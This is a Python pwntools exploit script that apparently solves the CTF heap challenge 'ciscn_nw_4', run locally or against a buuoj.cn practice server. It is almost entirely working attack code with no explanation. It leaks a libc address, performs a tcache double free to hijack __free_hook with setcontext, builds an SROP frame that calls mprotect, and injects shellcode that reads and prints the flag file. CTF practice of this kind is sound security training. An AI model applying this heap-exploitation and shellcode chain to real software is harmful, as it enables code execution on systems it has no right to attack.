#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='ciscn_nw_4'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/usr/lib/freelibs/amd64/2.27-3ubuntu1_amd64/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',25623)
			elf=ELF(elfelf)
			libc=ELF('../../x64libc/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendlineafter('>> ','1')
			io.sendlineafter('size?',str(a))
			io.sendafter('content?',b)

		def show(a):
			io.sendlineafter('>> ','3')
			io.sendlineafter('index ?',str(a))

		def delete(a):
			io.sendlineafter('>> ','2')
			io.sendlineafter('index ?',str(a))

		io.sendlineafter(' your name? ','keer')	
		add(0x500,'aaaa')
		add(0x300,'aaaa')
		delete(0)
		show(0)


		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']


		delete(1)
		delete(1)
		add(0x300,p64(libc.sym['__free_hook']))

		free_hook_addr=libc.sym['__free_hook']
		new_shell_code_head_addr=free_hook_addr&0xfffffffffffff000
		shell1='''
		xor rdi,rdi
		mov rsi,%d
		mov rdx,0x1000
		xor rax,rax

		syscall
		jmp rsi
		'''%new_shell_code_head_addr

		pay=p64(libc.sym['setcontext']+53)+p64(free_hook_addr+0x10)+asm(shell1)
		# edit(6,pay)
		srop_mprotect=SigreturnFrame()
		srop_mprotect.rsp=free_hook_addr+0x8
		srop_mprotect.rdi=new_shell_code_head_addr
		srop_mprotect.rsi=0x1000
		srop_mprotect.rdx=4|2|1
		srop_mprotect.rip=libc.sym['mprotect']
		add(0x300,str(srop_mprotect))
		add(0x300,pay)
		delete(3)
		shell2='''
		mov  rax,0x67616c662f2e
		push rax
		mov  rdi,rsp
		mov  rsi,0x0
		xor  rdx,rdx
		mov  rax,0x2
		syscall

		mov  rdi,rax
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x0
		syscall

		mov  rdi,0x1
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x1
		syscall
		'''
		io.sendline(asm(shell2))



		
		success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue